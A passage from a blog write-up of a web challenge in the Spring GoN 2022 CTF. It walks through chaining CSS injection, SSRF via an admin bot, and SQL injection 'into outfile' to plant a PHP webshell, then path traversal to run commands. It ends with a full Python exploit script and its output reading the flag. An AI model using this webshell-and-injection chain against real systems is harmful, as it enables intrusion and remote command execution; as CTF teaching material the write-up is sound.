        <span class="nv">$row</span> <span class="o">=</span> <span class="nf">mysqli_fetch_row</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">){</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">){</span>
                <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="nf">prepare</span><span class="p">(</span><span class="s1">'UPDATE memo SET adminCheck = 1 WHERE id = ?'</span><span class="p">);</span>
                <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">bind_param</span><span class="p">(</span><span class="s1">'i'</span><span class="p">,</span><span class="nv">$id</span><span class="p">);</span>
                <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">execute</span><span class="p">();</span>
                <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">close</span><span class="p">();</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">else</span><span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">"no hack"</span><span class="p">);</span>
<span class="p">}</span>
<span class="c1"># /var/www/html/check.php</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>
<p>SQL Injection occurred because it don’t check $id parameter in check.php. But SQL Injection is occuring only locally.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
<span class="kn">import</span> <span class="n">time</span>
<span class="kn">import</span> <span class="n">sys</span><span class="p">,</span> <span class="n">os</span>

<span class="n">memoid</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="nc">PhantomJS</span><span class="p">(</span><span class="n">service_log_path</span><span class="o">=</span><span class="sh">'</span><span class="s">/dev/null</span><span class="sh">'</span><span class="p">)</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">implicitly_wait</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">http://localhost/read.php?id=</span><span class="sh">"</span> <span class="o">+</span> <span class="n">memoid</span><span class="p">)</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">http://localhost/check.php?id=</span><span class="sh">"</span> <span class="o">+</span> <span class="n">memoid</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>
<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="nb">ctype_digit</span><span class="p">(</span><span class="nv">$id</span><span class="p">)){</span>
    <span class="nb">exec</span><span class="p">(</span><span class="s2">"python3 /bot.py "</span><span class="mf">.</span><span class="nv">$id</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">else</span><span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">"no hack"</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">die</span><span class="p">(</span><span class="s1">'&lt;script&gt; location.href="/" &lt;/script&gt;'</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>
<p>it calls bot.py in submit.php. we can’t exploit because it don’t check $id parameter using ctype_digit() function. But we can exploit as SSRF using background: url() of CSS. So I just decided to insert an SSRF PoC as color value using post writing function.</p>

<p><a href="https://user-images.githubusercontent.com/49112423/158553191-baf50b5b-22c5-4779-8f85-fcdd48168b82.png" class="popup img-link  shimmer"><img src="https://user-images.githubusercontent.com/49112423/158553191-baf50b5b-22c5-4779-8f85-fcdd48168b82.png" alt="" loading="lazy"></a></p>
<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/?path=write</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">host1.dreamhack.games:9111</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">95</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>

memoTitle=asdf&amp;memoColor=aqua}.content{background:%20url('https://google.com')&amp;memoContent=adsf
</pre></td></tr></tbody></table></code></div></div>
<p>I inserted an SSRF PoC as above. After this processing, When I go to connect, I could see that it request to check.php well. If we report this post, we can see that it sleep for 5 seconds. (delete photo)</p>

<div class="language-conf highlighter-rouge"><div class="code-header">
        <span data-label-text="Conf"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>[<span class="n">mysqld</span>]
<span class="n">pid</span>-<span class="n">file</span>        = /<span class="n">var</span>/<span class="n">run</span>/<span class="n">mysqld</span>/<span class="n">mysqld</span>.<span class="n">pid</span>
<span class="n">socket</span>          = /<span class="n">var</span>/<span class="n">run</span>/<span class="n">mysqld</span>/<span class="n">mysqld</span>.<span class="n">sock</span>
<span class="n">datadir</span>         = /<span class="n">var</span>/<span class="n">lib</span>/<span class="n">mysql</span>
<span class="n">secure</span>-<span class="n">file</span>-<span class="n">priv</span>= /<span class="n">tmp</span>/
<span class="n">default_authentication_plugin</span>=<span class="n">mysql_native_password</span>

<span class="c"># Custom config should go here
</span>!<span class="n">includedir</span> /<span class="n">etc</span>/<span class="n">mysql</span>/<span class="n">conf</span>.<span class="n">d</span>/
</pre></td></tr></tbody></table></code></div></div>
<p>Now we have to upload the webshell. So I tried to upload the webshell to /var/www/html/cmd.php but it failed. So I read a code that for finding a reason. The reason is that the value of secure-file-priv is /tmp.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/?path=write</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">host1.dreamhack.games:9111</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">220</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>

memoTitle=asdf&amp;memoColor=aqua}.content{background:%20url('/check.php?id=99999%20union%20select%20concat(char(60),"?php%20echo%20system($_GET[\'cmd\']);%20?",char(62))%20into%20outfile%20"/tmp/cmd1.php"')&amp;memoContent=adsf
</pre></td></tr></tbody></table></code></div></div>
<p>So, as above, I inserted the SQL Injection payload that upload the webshell in the /tmp/cmd1.php path and uploaded the webshell through the report function.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">string</span> 
<span class="kn">import</span> <span class="n">random</span>
<span class="kn">import</span> <span class="n">re</span>

<span class="n">CHALLURL</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://host2.dreamhack.games:16301</span><span class="sh">"</span>
<span class="n">LENGTH</span> <span class="o">=</span> <span class="mi">6</span>

<span class="n">string_pool</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span>
<span class="n">filename</span> <span class="o">=</span> <span class="sh">""</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">LENGTH</span><span class="p">):</span>
    <span class="n">filename</span> <span class="o">+=</span> <span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">string_pool</span><span class="p">)</span> 

<span class="n">FILANAME</span> <span class="o">=</span> <span class="n">filename</span> <span class="o">+</span> <span class="sh">'</span><span class="s">.php</span><span class="sh">'</span>
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[+] FILANAME : </span><span class="si">{</span><span class="n">FILANAME</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>

<span class="n">MEMODATA</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">'</span><span class="s">memoTitle</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">asdf</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">memoColor</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">aqua}.content{background: url(</span><span class="se">\'</span><span class="s">/check.php?id=9999999 union select concat(char(60),</span><span class="sh">"</span><span class="s">?php echo system($_GET[</span><span class="se">\\\'</span><span class="s">cmd</span><span class="se">\\\'</span><span class="s">]); ?</span><span class="sh">"</span><span class="s">,char(62)) into outfile </span><span class="sh">"</span><span class="s">/tmp/</span><span class="sh">'</span> <span class="o">+</span> <span class="n">FILANAME</span> <span class="o">+</span> <span class="sh">'"</span><span class="se">\'</span><span class="s">)</span><span class="sh">'</span><span class="p">,</span>
    <span class="sh">'</span><span class="s">memoContent</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">asdf</span><span class="sh">'</span>
<span class="p">}</span>
<span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">CHALLURL</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/?path=write</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[+] MEMODATA : </span><span class="si">{</span><span class="n">MEMODATA</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>

<span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">CHALLURL</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/?path=write</span><span class="sh">'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">MEMODATA</span><span class="p">)</span>
<span class="n">POST_COUNT</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="sh">'</span><span class="s">\&lt;th scope\=</span><span class="se">\"</span><span class="s">row</span><span class="se">\"</span><span class="s">\&gt;[0-9]*\&lt;\/th\&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">CHALLURL</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/?path=list</span><span class="sh">'</span><span class="p">).</span><span class="n">text</span><span class="p">)</span>
<span class="n">REPORT_NUM</span> <span class="o">=</span> <span class="n">POST_COUNT</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;th scope=</span><span class="sh">"</span><span class="s">row</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;/th&gt;</span><span class="sh">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

<span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">CHALLURL</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">'</span><span class="s">/submit.php?id=</span><span class="si">{</span><span class="n">REPORT_NUM</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">[+] Enable webshell!!</span><span class="sh">"</span><span class="p">)</span>

<span class="nf">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Enter the command : </span><span class="sh">"</span><span class="p">)</span>
    <span class="n">RESULT</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">CHALLURL</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">'</span><span class="s">/?path=../../../../../../tmp/</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s">&amp;cmd=</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="sh">'</span><span class="p">).</span><span class="n">text</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;div class=</span><span class="sh">"</span><span class="s">body</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;/div&gt;</span><span class="sh">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nf">strip</span><span class="p">()</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">RESULT</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>
<p>I wrote the exploit code as above</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>❯ python3 poc.py
[+] FILANAME : 367455.php
[+] MEMODATA : {'memoTitle': 'asdf', 'memoColor': 'aqua}.content{background: url(\'/check.php?id=9999999 union select concat(char(60),"?php echo system($_GET[\\\'cmd\\\']); ?",char(62)) into outfile "/tmp/367455.php"\')', 'memoContent': 'asdf'}

[+] Enable webshell!!
[+] Enter the command : id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[+] Enter the command : pwd
/var/www/html
/var/www/html
[+] Enter the command : ls / | grep '^flag'
flag_47ef1a0fd43364198f2422159badba75
flag_47ef1a0fd43364198f2422159badba75
[+] Enter the command : cat /flag_47ef1a0fd43364198f2422159badba75
GoN{cH41N_0f_W3b_VuLn3r4b1l1t1E5}GoN{cH41N_0f_W3b_VuLn3r4b1l1t1E5}
[+] Enter the command : 
</pre></td></tr></tbody></table></code></div></div>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>FLAG : GoN{cH41N_0f_W3b_VuLn3r4b1l1t1E5}
</pre></td></tr></tbody></table></code></div></div>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    

    <!-- tags -->
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Spring%20GoN%20Open%20Qual%20CTF%202022%20Write%20Up%20-%20Web2.0&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FGoN-CTF%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Spring%20GoN%20Open%20Qual%20CTF%202022%20Write%20Up%20-%20Web2.0&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FGoN-CTF%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FGoN-CTF%2F&text=Spring%20GoN%20Open%20Qual%20CTF%202022%20Write%20Up%20-%20Web2.0" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get the last 5 posts from lastmod list. -->















              <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/microsoft/">Microsoft</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->

























            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/xss-total.js/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Total.js CMS, Cross-Site Scripting</p>
    </a>
  

  
    <a
      href="/posts/Line-CTF/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>Line CTF 2022 Write Up</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->


            

            <!-- The Footer -->

<footer
style="background-color:#030014"
>

</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/microsoft/">Microsoft</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.21.3/dist/tocbot.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

